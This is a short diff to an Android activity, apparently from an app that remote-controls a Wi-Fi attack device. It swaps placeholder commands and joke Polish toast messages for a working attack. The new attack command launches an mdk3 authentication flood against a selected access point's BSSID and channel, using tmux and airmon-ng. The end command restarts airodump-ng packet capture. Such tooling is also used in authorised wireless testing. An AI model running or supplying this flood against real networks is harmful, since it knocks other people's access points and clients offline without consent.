@@ -41,10 +41,10 @@ public class AttackToggleAccessPoint extends AppCompatActivity implements MyCall
 
         final Device device = getIntent().getExtras().getParcelable("device");
 
-        final String attackCommand = "touch watykan";
-        final String endCommand = "rm watykan";
-        final String statusToToastStarted = "DRUGI ATAK NA WATYKAN PRZEPROWADZONO POMYSLNIE";
-        final String statusToToastEnded = "DRUGI ATAK NA WATYKAN ZAKONCZONO POMYSLNIE";
+        final String attackCommand = "tmux kill-session -t kismet; tmux kill-session -t airodump; tmux new-session -d -s fakeAuth 'airmon-ng stop wlan1; airmon-ng start wlan1 " + device.getChannel() + " && mdk3 wlan1 a -a " + device.getBssid() + "'";
+        final String endCommand = "tmux kill-session -t fakeAuth; tmux new-session -d -s airodump 'airmon-ng stop wlan1; airmon-ng start wlan1 && airodump-ng wlan1 --output-format netxml -w /tmp/recent'";
+        final String statusToToastStarted = "Fake authentication launched";
+        final String statusToToastEnded = "Fake authentication terminated";
 
 
         getSupportActionBar().setTitle(device.getName());
